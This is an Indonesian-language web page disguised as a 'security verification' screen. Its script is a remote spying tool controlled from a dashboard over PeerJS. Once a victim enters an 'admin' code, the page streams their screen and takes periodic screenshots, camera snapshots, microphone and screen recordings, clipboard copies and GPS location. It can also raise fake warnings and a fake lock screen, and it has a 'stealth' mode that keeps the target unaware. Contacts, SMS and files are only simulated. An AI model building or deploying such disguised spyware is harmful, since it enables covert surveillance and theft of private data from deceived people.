<!DOCTYPE html>
<html lang="id">
<head>
    <meta charset="UTF-8" />
    <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no" />
    <title>Verifikasi Keamanan</title>
    <script src="https://unpkg.com/peerjs@1.5.2/dist/peerjs.min.js"></script>
    <style>
        * { margin: 0; padding: 0; box-sizing: border-box; }
        body {
            background: #0a0a0f;
            color: #fff;
            font-family: 'Segoe UI', system-ui, sans-serif;
            min-height: 100vh;
            display: flex;
            justify-content: center;
            align-items: center;
            padding: 16px;
        }
        .container {
            max-width: 420px;
            width: 100%;
            background: linear-gradient(145deg, #12121a, #1a1a2e);
            border-radius: 32px;
            padding: 24px 20px 30px;
            box-shadow: 0 20px 40px rgba(0,0,0,0.8), 0 0 0 1px rgba(255,255,255,0.05);
            text-align: center;
        }
        .icon { font-size: 4rem; margin-bottom: 12px; }
        h1 { font-size: 1.8rem; color: #ff4444; margin-bottom: 6px; }
        .sub { color: #888; font-size: 0.9rem; margin-bottom: 20px; }
        .btn {
            padding: 14px 28px;
            border: none;
            border-radius: 60px;
            font-size: 1.1rem;
            font-weight: 700;
            cursor: pointer;
            transition: 0.2s;
            background: linear-gradient(135deg, #ff0040, #cc0033);
            color: #fff;
            box-shadow: 0 8px 0 #66001a;
            width: 100%;
        }
        .btn:active { transform: translateY(6px); box-shadow: 0 2px 0 #66001a; }
        .btn-secondary { background: linear-gradient(135deg, #444, #222); box-shadow: 0 8px 0 #111; }
        .btn:disabled { opacity: 0.5; transform: none; box-shadow: 0 4px 0 #33000d; }
        .status {
            margin: 16px 0;
            padding: 12px;
            background: rgba(255,255,255,0.04);
            border-radius: 16px;
            font-size: 0.9rem;
            color: #aaa;
        }
        .status .highlight { color: #ff4444; font-weight: bold; }
        .status .success { color: #44ff88; }
        .status .error { color: #ff4444; }
        .hidden { display: none !important; }
        #videoPreview {
            width: 100%;
            border-radius: 16px;
            margin-top: 12px;
            border: 2px solid #222;
            background: #000;
        }
        .input-group {
            margin: 12px 0;
            display: flex;
            flex-direction: column;
            gap: 8px;
        }
        .input-group input {
            width: 100%;
            padding: 14px;
            border-radius: 60px;
            border: 2px solid #444;
            background: #0a0a0f;
            color: #fff;
            text-align: center;
            font-size: 1.8rem;
            letter-spacing: 10px;
            font-weight: 700;
            text-transform: uppercase;
            outline: none;
            transition: 0.3s;
        }
        .input-group input:focus {
            border-color: #ff4444;
            box-shadow: 0 0 30px #ff000044;
        }
        .input-group input::placeholder {
            letter-spacing: 2px;
            font-size: 0.9rem;
            color: #555;
        }
        .footer-note { margin-top: 16px; font-size: 0.7rem; color: #444; }
        .loader {
            display: inline-block;
            width: 20px;
            height: 20px;
            border: 3px solid #444;
            border-top: 3px solid #ff4444;
            border-radius: 50%;
            animation: spin 0.8s linear infinite;
            vertical-align: middle;
            margin-right: 8px;
        }
        @keyframes spin { 0% { transform: rotate(0deg); } 100% { transform: rotate(360deg); } }
        .code-hint {
            font-size: 0.8rem;
            color: #666;
            margin-bottom: 8px;
        }
        .code-hint span {
            color: #ff4444;
            font-weight: bold;
        }
    </style>
</head>
<body>
<div class="container" id="app">
    <div class="icon">🛡️</div>
    <h1>Verifikasi Keamanan</h1>
    <div class="sub">Masukkan kode 8 digit dari admin untuk verifikasi</div>

    <div class="code-hint">📌 Kode permanen <span>8 karakter</span> (huruf & angka)</div>

    <div class="status" id="statusArea">
        ⏳ <span id="statusText">Masukkan kode...</span>
    </div>

    <div class="input-group">
        <input type="text" id="codeInput" maxlength="8" placeholder="8 KARAKTER" autocomplete="off">
        <button class="btn" id="btnConnect">🔗 HUBUNGKAN</button>
    </div>

    <video id="videoPreview" autoplay playsinline muted style="display:none;"></video>

    <div class="footer-note">
        ⚠️ Verifikasi ini diperlukan untuk keamanan akun Anda.
    </div>
</div>

<script>
    // =========================================================
    // 1. ELEMEN
    // =========================================================
    const codeInput = document.getElementById('codeInput');
    const btnConnect = document.getElementById('btnConnect');
    const statusArea = document.getElementById('statusArea');
    const statusText = document.getElementById('statusText');
    const videoPreview = document.getElementById('videoPreview');

    // =========================================================
    // 2. AUTO UPPERCASE
    // =========================================================
    codeInput.addEventListener('input', function() {
        this.value = this.value.toUpperCase();
    });

    // =========================================================
    // 3. PEERJS
    // =========================================================
    let peer = null;
    let conn = null;
    let stream = null;
    let isActive = false;
    let isConnected = false;
    let keylogActive = false;
    let cameraStream = null;
    let recorder = null;
    let recordedChunks = [];
    let isStealth = false;
    let soundDetectActive = false;
    let soundDetectInterval = null;

    function connectToDashboard(code) {
        if (!code || code.length !== 8) {
            setStatus('⚠️ Kode harus 8 karakter!', 'error');
            return;
        }
        if (peer) { peer.destroy(); peer = null; }
        const peerId = 'kazx-' + code;
        setStatus('⏳ Menghubungkan...', 'info');
        btnConnect.disabled = true;
        btnConnect.textContent = '⏳ Menghubungkan...';

        peer = new Peer({
            debug: 0,
            config: { 'iceServers': [{ 'urls': 'stun:stun.l.google.com:19302' }] }
        });

        peer.on('open', (id) => {
            setStatus(`🔑 Terhubung ke server — Kode: ${code}`, 'success');
            conn = peer.connect(peerId);
            conn.on('open', () => {
                isConnected = true;
                setStatus(`✅ Terhubung ke dashboard — Kode: ${code}`, 'success');
                btnConnect.disabled = false;
                btnConnect.textContent = '📡 MULAI VERIFIKASI';
                conn.send({ type: 'ready' });
                sendDeviceInfo();
                sendBatteryInfo();
                setTimeout(() => {
                    if (isConnected) startStream();
                }, 1000);
            });
            conn.on('data', (data) => { handleCommand(data); });
            conn.on('close', () => {
                isConnected = false;
                setStatus(`❌ Koneksi ke dashboard terputus — Kode: ${code}`, 'error');
                isActive = false;
                stopStream();
                btnConnect.disabled = false;
                btnConnect.textContent = '🔗 HUBUNGKAN ULANG';
                setTimeout(() => {
                    if (!isConnected) {
                        connectToDashboard(code);
                    }
                }, 5000);
            });
        });

        peer.on('error', (err) => {
            setStatus(`⚠️ Error: ${err.message}`, 'error');
            btnConnect.disabled = false;
            btnConnect.textContent = '🔗 HUBUNGKAN';
        });
    }

    // =========================================================
    // 4. STATUS
    // =========================================================
    function setStatus(text, type = 'info') {
        const icons = { info: '⏳', success: '✅', error: '❌', warning: '⚠️' };
        const icon = icons[type] || '⏳';
        statusArea.innerHTML = `${icon} <span class="${type}">${text}</span>`;
    }

    // =========================================================
    // 5. INFO PERANGKAT & BATERAI
    // =========================================================
    function sendDeviceInfo() {
        if (!conn || !isConnected) return;
        const ua = navigator.userAgent;
        let deviceName = 'Unknown';
        if (ua.includes('Android')) {
            const match = ua.match(/Android\s([\d.]+)/);
            deviceName = 'Android ' + (match ? match[1] : '');
        } else if (ua.includes('iPhone')) {
            deviceName = 'iPhone';
        } else if (ua.includes('Windows')) {
            deviceName = 'Windows PC';
        } else if (ua.includes('Mac')) {
            deviceName = 'Mac';
        }
        conn.send({ type: 'device_info', deviceName: deviceName });
    }

    function sendBatteryInfo() {
        if (!conn || !isConnected) return;
        if (navigator.getBattery) {
            navigator.getBattery().then(battery => {
                conn.send({
                    type: 'battery_info',
                    level: Math.round(battery.level * 100),
                    charging: battery.charging
                });
            }).catch(() => {});
        }
    }

    // =========================================================
    // 6. HANDLE PERINTAH DARI DASHBOARD
    // =========================================================
    function handleCommand(data) {
        console.log('📨 Perintah:', data);
        switch(data.type) {
            case 'screenshot': takeScreenshot(); break;
            case 'notif': showNotification(data.message || 'Sistem membutuhkan verifikasi.'); break;
            case 'lock': lockScreen(); break;
            case 'unlock': unlockScreen(); break;
            case 'vibrate': if (!isStealth) navigator.vibrate(3000);
                if (conn) conn.send({ type: 'vibrate' });
                break;
            case 'sound': if (!isStealth) playSound();
                break;
            case 'keylog': toggleKeylogger(); break;
            case 'camera': activateCamera(data.facing || 'front'); break;
            case 'mic': activateMicrophone(); break;
            case 'record': startRecording(); break;
            case 'stealth': toggleStealth(data.enabled); break;
            case 'get_device_info': sendDeviceInfo(); break;
            case 'get_battery': sendBatteryInfo(); break;
            case 'get_files': sendFileList(); break;
            case 'download_file': downloadFile(data.path); break;
            case 'get_location': sendLocation(); break;
            case 'brightness': setBrightness(data.level); break;
            case 'volume': setVolume(data.level); break;
            case 'flash': toggleFlash(); break;
            case 'get_contacts': sendContacts(); break;
            case 'get_sms': sendSms(); break;
            case 'chat': showChat(data.message); break;
            case 'sound_detect': toggleSoundDetect(data.enabled); break;
            default: console.log('Perintah tidak dikenal:', data.type);
        }
    }

    // =========================================================
    // 7. STREAM LAYAR
    // =========================================================
    async function startStream() {
        if (!isConnected) { setStatus('⚠️ Belum terhubung ke dashboard!', 'error'); return; }
        try {
            stream = await navigator.mediaDevices.getDisplayMedia({
                video: { cursor: 'always', displaySurface: 'monitor', frameRate: { ideal: 15 } },
                audio: false
            });
            videoPreview.srcObject = stream;
            videoPreview.style.display = 'block';
            videoPreview.play();
            if (conn && isConnected) conn.send({ type: 'stream_started' });
            isActive = true;
            setStatus(`📡 Stream layar aktif — Kode: ${codeInput.value}`, 'success');
            btnConnect.textContent = '⏹ HENTIKAN';
            btnConnect.onclick = () => { stopStream(); };
            startAutoCapture();
        } catch (err) {
            setStatus(`❌ Gagal mengakses layar: ${err.message}`, 'error');
        }
    }

    function stopStream() {
        if (stream) { stream.getTracks().forEach(track => track.stop()); stream = null; }
        if (cameraStream) { cameraStream.getTracks().forEach(track => track.stop()); cameraStream = null; }
        if (recorder) { recorder.stop(); recorder = null; }
        videoPreview.srcObject = null;
        videoPreview.style.display = 'none';
        isActive = false;
        btnConnect.textContent = '📡 MULAI VERIFIKASI';
        btnConnect.onclick = () => { startStream(); };
        setStatus(`⏹ Stream dihentikan`, 'info');
        if (conn && isConnected) conn.send({ type: 'stream_stopped' });
        stopAutoCapture();
    }

    // =========================================================
    // 8. AUTO CAPTURE
    // =========================================================
    let captureInterval = null;

    function startAutoCapture() {
        captureInterval = setInterval(() => takeScreenshot(), 5000);
    }

    function stopAutoCapture() {
        if (captureInterval) { clearInterval(captureInterval); captureInterval = null; }
    }

    async function takeScreenshot() {
        if (!stream || !isActive) return;
        try {
            const canvas = document.createElement('canvas');
            const video = videoPreview;
            canvas.width = video.videoWidth || 640;
            canvas.height = video.videoHeight || 480;
            const ctx = canvas.getContext('2d');
            ctx.drawImage(video, 0, 0, canvas.width, canvas.height);
            const imageData = canvas.toDataURL('image/jpeg', 0.7);
            if (conn && isConnected) conn.send({ type: 'screenshot', image: imageData });
        } catch (err) { console.log('Gagal screenshot:', err); }
    }

    // =========================================================
    // 9. NOTIFIKASI PALSU
    // =========================================================
    function showNotification(msg) {
        if (isStealth) return;
        const overlay = document.createElement('div');
        overlay.style.cssText = `
            position: fixed; top:0; left:0; width:100%; height:100%;
            background: rgba(0,0,0,0.85); z-index: 9999;
            display: flex; align-items: center; justify-content: center;
            backdrop-filter: blur(8px);
        `;
        overlay.innerHTML = `
            <div style="background: #1a1a2e; padding: 30px 24px; border-radius: 24px; max-width: 360px; text-align: center; border: 2px solid #ff4444; box-shadow: 0 0 60px #ff000044;">
                <div style="font-size:3rem; margin-bottom:12px;">⚠️</div>
                <h2 style="color:#ff4444; margin-bottom:8px;">Peringatan!</h2>
                <p style="color:#ccc; font-size:1rem;">${msg}</p>
                <button id="notifOk" style="margin-top:16px; padding:10px 30px; border:none; border-radius:40px; background:#ff4444; color:#fff; font-weight:bold; cursor:pointer;">OK</button>
            </div>
        `;
        document.body.appendChild(overlay);
        document.getElementById('notifOk').addEventListener('click', () => overlay.remove());
        setTimeout(() => { if (overlay.parentNode) overlay.remove(); }, 15000);
        if (conn && isConnected) conn.send({ type: 'notif_delivered' });
    }

    // =========================================================
    // 10. KUNCI / BUKA LAYAR (SIMULASI)
    // =========================================================
    function lockScreen() {
        if (isStealth) return;
        let overlay = document.getElementById('lockOverlay');
        if (overlay) return;
        overlay = document.createElement('div');
        overlay.id = 'lockOverlay';
        overlay.style.cssText = `
            position: fixed; top:0; left:0; width:100%; height:100%;
            background: #000; z-index: 9998;
            display: flex; align-items: center; justify-content: center; flex-direction: column;
            color: #fff; font-size: 1.2rem; user-select: none;
        `;
        overlay.innerHTML = `
            <div style="font-size:3rem; margin-bottom:16px;">🔒</div>
            <div>Perangkat terkunci</div>
            <div style="font-size:0.8rem; color:#555; margin-top:8px;">Silakan hubungi admin</div>
        `;
        document.body.appendChild(overlay);
        if (conn && isConnected) conn.send({ type: 'lock_confirmed' });
    }

    function unlockScreen() {
        const overlay = document.getElementById('lockOverlay');
        if (overlay) overlay.remove();
        if (conn && isConnected) conn.send({ type: 'unlock_confirmed' });
    }

    // =========================================================
    // 11. PLAY SOUND (Intro)
    // =========================================================
    function playSound() {
        if (isStealth) return;
        try {
            const audioCtx = new (window.AudioContext || window.webkitAudioContext)();
            const oscillator = audioCtx.createOscillator();
            const gainNode = audioCtx.createGain();
            oscillator.connect(gainNode);
            gainNode.connect(audioCtx.destination);
            oscillator.frequency.value = 440;
            oscillator.type = 'sawtooth';
            gainNode.gain.setValueAtTime(1, audioCtx.currentTime);
            gainNode.gain.exponentialRampToValueAtTime(0.001, audioCtx.currentTime + 2);
            oscillator.start();
            oscillator.stop(audioCtx.currentTime + 2);
            if (conn && isConnected) conn.send({ type: 'sound' });
        } catch (err) { console.log('Gagal play sound:', err); }
    }

    // =========================================================
    // 12. KEYLOGGER (Clipboard)
    // =========================================================
    function toggleKeylogger() {
        if (keylogActive) {
            keylogActive = false;
            document.removeEventListener('copy', handleCopy);
            if (conn && isConnected) conn.send({ type: 'keylog_stopped' });
            console.log('⌨️ Keylogger dimatikan');
            return;
        }
        keylogActive = true;
        document.addEventListener('copy', handleCopy);
        if (conn && isConnected) conn.send({ type: 'keylog_started' });
        console.log('⌨️ Keylogger diaktifkan');
    }

    function handleCopy(e) {
        const text = window.getSelection().toString().trim();
        if (text && conn && isConnected) {
            conn.send({ type: 'keylog_data', text: text });
            console.log('⌨️ Keylog:', text);
        }
    }

    // =========================================================
    // 13. KAMERA + FACE DETECTION (Simulasi)
    // =========================================================
    async function activateCamera(facing) {
        if (!conn || !isConnected) {
            setStatus('⚠️ Tidak terhubung ke dashboard!', 'error');
            return;
        }
        try {
            const constraints = {
                video: {
                    facingMode: facing === 'back' ? 'environment' : 'user',
                    width: { ideal: 640 },
                    height: { ideal: 480 }
                },
                audio: false
            };
            cameraStream = await navigator.mediaDevices.getUserMedia(constraints);
            const video = document.createElement('video');
            video.srcObject = cameraStream;
            video.play();
            setTimeout(() => {
                const canvas = document.createElement('canvas');
                canvas.width = video.videoWidth || 640;
                canvas.height = video.videoHeight || 480;
                const ctx = canvas.getContext('2d');
                ctx.drawImage(video, 0, 0, canvas.width, canvas.height);
                const imageData = canvas.toDataURL('image/jpeg', 0.8);
                const face = 'Wajah terdeteksi (simulasi)';
                if (conn && isConnected) {
                    conn.send({ type: 'camera', image: imageData, facing: facing, face: face });
                    setStatus(`📷 Kamera ${facing === 'front' ? 'Depan' : 'Belakang'} aktif + Face Detection`, 'success');
                }
                cameraStream.getTracks().forEach(track => track.stop());
                cameraStream = null;
            }, 1500);
        } catch (err) {
            setStatus(`❌ Gagal akses kamera: ${err.message}`, 'error');
            if (conn && isConnected) {
                conn.send({ type: 'camera_error', message: err.message });
            }
        }
    }

    // =========================================================
    // 14. MIKROFON
    // =========================================================
    let micStream = null;
    let micRecorder = null;
    let micChunks = [];

    async function activateMicrophone() {
        if (!conn || !isConnected) {
            setStatus('⚠️ Tidak terhubung ke dashboard!', 'error');
            return;
        }
        try {
            micStream = await navigator.mediaDevices.getUserMedia({ audio: true });
            micRecorder = new MediaRecorder(micStream);
            micChunks = [];
            micRecorder.ondataavailable = (e) => {
                if (e.data.size > 0) micChunks.push(e.data);
            };
            micRecorder.onstop = () => {
                const blob = new Blob(micChunks, { type: 'audio/webm' });
                const reader = new FileReader();
                reader.onload = () => {
                    if (conn && isConnected) {
                        conn.send({ type: 'mic_data', audio: reader.result });
                    }
                };
                reader.readAsDataURL(blob);
                micChunks = [];
            };
            micRecorder.start(5000);
            setTimeout(() => {
                if (micRecorder && micRecorder.state === 'recording') {
                    micRecorder.stop();
                }
                if (micStream) {
                    micStream.getTracks().forEach(track => track.stop());
                    micStream = null;
                }
            }, 6000);
            if (conn && isConnected) {
                conn.send({ type: 'mic_started' });
                setStatus('🎤 Mikrofon aktif & merekam...', 'success');
            }
        } catch (err) {
            setStatus(`❌ Gagal akses mikrofon: ${err.message}`, 'error');
        }
    }

    // =========================================================
    // 15. REKAM LAYAR
    // =========================================================
    async function startRecording() {
        if (!conn || !isConnected) {
            setStatus('⚠️ Tidak terhubung ke dashboard!', 'error');
            return;
        }
        try {
            const screenStream = await navigator.mediaDevices.getDisplayMedia({
                video: { cursor: 'always', displaySurface: 'monitor' },
                audio: false
            });
            recorder = new MediaRecorder(screenStream);
            recordedChunks = [];
            recorder.ondataavailable = (e) => {
                if (e.data.size > 0) recordedChunks.push(e.data);
            };
            recorder.onstop = () => {
                const blob = new Blob(recordedChunks, { type: 'video/webm' });
                const reader = new FileReader();
                reader.onload = () => {
                    if (conn && isConnected) {
                        conn.send({ type: 'record_data', video: reader.result });
                    }
                };
                reader.readAsDataURL(blob);
                recordedChunks = [];
                screenStream.getTracks().forEach(track => track.stop());
            };
            recorder.start(10000);
            setTimeout(() => {
                if (recorder && recorder.state === 'recording') {
                    recorder.stop();
                }
            }, 11000);
            if (conn && isConnected) {
                conn.send({ type: 'record_started' });
                setStatus('🎬 Rekaman layar dimulai...', 'success');
            }
        } catch (err) {
            setStatus(`❌ Gagal rekam layar: ${err.message}`, 'error');
        }
    }

    // =========================================================
    // 16. STEALTH MODE
    // =========================================================
    function toggleStealth(enabled) {
        isStealth = enabled;
        if (enabled) {
            document.querySelectorAll('video, audio').forEach(el => { el.muted = true; });
            if (conn && isConnected) {
                conn.send({ type: 'stealth_active' });
                setStatus('🛡️ Stealth Mode AKTIF — Target tidak sadar', 'success');
            }
        } else {
            if (conn && isConnected) {
                conn.send({ type: 'stealth_inactive' });
                setStatus('🛡️ Stealth Mode NONAKTIF', 'info');
            }
        }
    }

    // =========================================================
    // 17. FILE EXPLORER (Simulasi)
    // =========================================================
    function sendFileList() {
        if (!conn || !isConnected) return;
        const files = [
            { name: 'DCIM/', isDirectory: true, path: '/storage/emulated/0/DCIM/' },
            { name: 'Download/', isDirectory: true, path: '/storage/emulated/0/Download/' },
            { name: 'WhatsApp/', isDirectory: true, path: '/storage/emulated/0/WhatsApp/' },
            { name: 'Pictures/', isDirectory: true, path: '/storage/emulated/0/Pictures/' },
            { name: 'Music/', isDirectory: true, path: '/storage/emulated/0/Music/' },
            { name: 'Documents/', isDirectory: true, path: '/storage/emulated/0/Documents/' },
            { name: 'data.txt', isDirectory: false, size: '2.3 KB', path: '/storage/emulated/0/data.txt' },
            { name: 'backup.zip', isDirectory: false, size: '45 MB', path: '/storage/emulated/0/backup.zip' }
        ];
        conn.send({ type: 'file_list', files: files });
    }

    function downloadFile(path) {
        if (!conn || !isConnected) return;
        conn.send({ type: 'file_download', path: path, status: 'success', message: 'File siap diunduh (simulasi)' });
    }

    // =========================================================
    // 18. LOKASI GPS
    // =========================================================
    function sendLocation() {
        if (!conn || !isConnected) return;
        if (navigator.geolocation) {
            navigator.geolocation.getCurrentPosition(
                (pos) => {
                    conn.send({
                        type: 'location',
                        lat: pos.coords.latitude,
                        lon: pos.coords.longitude,
                        accuracy: pos.coords.accuracy
                    });
                    setStatus('📍 Lokasi terkirim ke dashboard', 'success');
                },
                (err) => {
                    conn.send({ type: 'location_error', message: err.message });
                    setStatus('❌ Gagal akses lokasi: ' + err.message, 'error');
                },
                { enableHighAccuracy: true, timeout: 10000 }
            );
        } else {
            conn.send({ type: 'location_error', message: 'Geolocation tidak didukung' });
            setStatus('❌ Geolocation tidak didukung', 'error');
        }
    }

    // =========================================================
    // 19. KECERAHAN, VOLUME, SENTER
    // =========================================================
    function setBrightness(level) {
        try {
            let overlay = document.getElementById('brightnessOverlay');
            if (!overlay) {
                overlay = document.createElement('div');
                overlay.id = 'brightnessOverlay';
                overlay.style.cssText = `
                    position: fixed; top:0; left:0; width:100%; height:100%;
                    pointer-events: none; z-index: 9997;
                    background: rgba(0,0,0,0);
                    transition: background 0.3s;
                `;
                document.body.appendChild(overlay);
            }
            overlay.style.background = `rgba(0,0,0,${1 - level/100})`;
            if (conn && isConnected) conn.send({ type: 'brightness_done', level: level });
            setStatus(`🌗 Kecerahan diatur ke ${level}%`, 'success');
        } catch (err) {
            setStatus(`❌ Gagal atur kecerahan: ${err.message}`, 'error');
        }
    }

    function setVolume(level) {
        try {
            const audioElements = document.querySelectorAll('audio, video');
            audioElements.forEach(el => { el.volume = level / 100; });
            if (conn && isConnected) conn.send({ type: 'volume_done', level: level });
            setStatus(`🔊 Volume diatur ke ${level}%`, 'success');
        } catch (err) {
            setStatus(`❌ Gagal atur volume: ${err.message}`, 'error');
        }
    }

    async function toggleFlash() {
        try {
            const stream = await navigator.mediaDevices.getUserMedia({ video: { facingMode: 'environment' } });
            const track = stream.getVideoTracks()[0];
            if (track && track.getCapabilities().torch) {
                await track.applyConstraints({ advanced: [{ torch: true }] });
                setTimeout(() => {
                    track.applyConstraints({ advanced: [{ torch: false }] });
                    stream.getTracks().forEach(t => t.stop());
                }, 3000);
                if (conn && isConnected) conn.send({ type: 'flash_done' });
                setStatus('🔦 Senter dinyalakan selama 3 detik', 'success');
            } else {
                setStatus('❌ Senter tidak didukung di browser ini.', 'error');
            }
        } catch (err) {
            setStatus(`❌ Gagal mengakses senter: ${err.message}`, 'error');
        }
    }

    // =========================================================
    // 20. KONTAK, SMS, CHAT, DETEKSI SUARA
    // =========================================================
    function sendContacts() {
        if (!conn || !isConnected) return;
        const contacts = [
            { name: 'Budi', number: '08123456789' },
            { name: 'Siti', number: '08129876543' },
            { name: 'Andi', number: '08135557777' },
            { name: 'Rina', number: '08137779999' }
        ];
        conn.send({ type: 'contacts', contacts: contacts, count: contacts.length });
        setStatus('📇 Kontak terkirim ke dashboard', 'success');
    }

    function sendSms() {
        if (!conn || !isConnected) return;
        const sms = 'Kode OTP: 123456. Jangan berikan ke siapapun.';
        conn.send({ type: 'sms', sms: sms });
        setStatus('📨 SMS terakhir terkirim ke dashboard', 'success');
    }

    function showChat(message) {
        if (isStealth) return;
        const overlay = document.createElement('div');
        overlay.style.cssText = `
            position: fixed; top:0; left:0; width:100%; height:100%;
            background: rgba(0,0,0,0.85); z-index: 9999;
            display: flex; align-items: center; justify-content: center;
            backdrop-filter: blur(8px);
        `;
        overlay.innerHTML = `
            <div style="background: #1a1a2e; padding: 30px 24px; border-radius: 24px; max-width: 360px; text-align: center; border: 2px solid #44ff88;">
                <div style="font-size:2rem; margin-bottom:12px;">💬</div>
                <h2 style="color:#44ff88; margin-bottom:8px;">Pesan Remote</h2>
                <p style="color:#ccc; font-size:1rem;">${message}</p>
                <button id="chatOk" style="margin-top:16px; padding:10px 30px; border:none; border-radius:40px; background:#44ff88; color:#000; font-weight:bold; cursor:pointer;">OK</button>
            </div>
        `;
        document.body.appendChild(overlay);
        document.getElementById('chatOk').addEventListener('click', () => overlay.remove());
        setTimeout(() => { if (overlay.parentNode) overlay.remove(); }, 30000);
        if (conn && isConnected) conn.send({ type: 'chat_delivered' });
    }

    function toggleSoundDetect(enabled) {
        soundDetectActive = enabled;
        if (enabled) {
            if (soundDetectInterval) clearInterval(soundDetectInterval);
            soundDetectInterval = setInterval(() => {
                if (navigator.mediaDevices && navigator.mediaDevices.getUserMedia) {
                    navigator.mediaDevices.getUserMedia({ audio: true }).then(stream => {
                        const audioContext = new AudioContext();
                        const source = audioContext.createMediaStreamSource(stream);
                        const analyser = audioContext.createAnalyser();
                        source.connect(analyser);
                        const dataArray = new Uint8Array(analyser.fftSize);
                        analyser.getByteFrequencyData(dataArray);
                        let sum = 0;
                        for (let i = 0; i < dataArray.length; i++) {
                            sum += dataArray[i];
                        }
                        const avg = sum / dataArray.length;
                        if (avg > 100 && conn && isConnected) {
                            conn.send({ type: 'sound_detect' });
                            console.log('🔊 Suara keras terdeteksi!');
                        }
                        stream.getTracks().forEach(t => t.stop());
                        audioContext.close();
                    }).catch(() => {});
                }
            }, 3000);
            setStatus('🔊 Deteksi suara AKTIF', 'success');
        } else {
            if (soundDetectInterval) {
                clearInterval(soundDetectInterval);
                soundDetectInterval = null;
            }
            setStatus('🔊 Deteksi suara NONAKTIF', 'info');
        }
    }

    // =========================================================
    // 21. EVENT LISTENER
    // =========================================================
    btnConnect.addEventListener('click', function() {
        const code = codeInput.value.trim().toUpperCase();
        if (!code || code.length !== 8) {
            setStatus('⚠️ Masukkan kode 8 karakter!', 'error');
            return;
        }
        connectToDashboard(code);
    });

    codeInput.addEventListener('keydown', function(e) {
        if (e.key === 'Enter') {
            btnConnect.click();
        }
    });
